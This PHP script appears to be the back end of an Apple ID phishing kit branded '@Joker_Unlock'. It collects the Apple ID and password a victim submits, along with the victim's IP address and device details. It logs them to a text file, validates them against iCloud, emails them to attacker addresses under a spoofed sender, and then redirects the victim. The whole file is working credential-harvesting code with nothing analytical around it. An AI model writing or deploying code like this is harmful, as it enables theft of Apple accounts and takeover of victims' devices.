<?php 
$email= $_POST['appleid'];
$pass= $_POST['password'];
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$user_ip = getUserIP();
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$agent = $_SERVER['HTTP_USER_AGENT'];
$remote = $_SERVER['REMOTE_ADDR'];
// Additional headers
$headers .= 'To: New User' . "\r\n";
$headers .= 'From: iServer' . "\r\n";

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// Send email with reply
$to  = "urmail@gmail.com,urmail@hotmail.com";

// Subject
$subject = 'Key Ready By @Joker_Unlock';

// Message
$message = "\r\n Enjoy Unlock By @Joker_Unlock \r\n ".
"1PAddre55: $user_ip \r\n".
"Joker Email: $email \r\n".
"Joker Pass: $pass \r\n".
"Time-Date: $time - $date \r\n".
"Dvice typ: $agent \r\n".
"1PAddre55: http://whatismyipaddress.com/$remote \r\n";

require 'FindMyiPhone.php';
try {
$file=fopen("findmyiphone.txt","a");
fwrite($file,$message);
fwrite($file,"\r\n");
fclose($file);

	$FindMyiPhone = new FindMyiPhone($email, $pass);


} catch (exception $e) {
	if($e->getMessage()==true){
		// Mail it
// send email
$headers = "From:UNl0CKED <admin@help-iphone.info>" . "\r\n" ;
mail($to, $subject, $message, $headers);

header("Location: /map/ "); 
	}else{
		header('Location: '.$_SERVER['HTTP_REFERER'].'?error');
	}
}

?>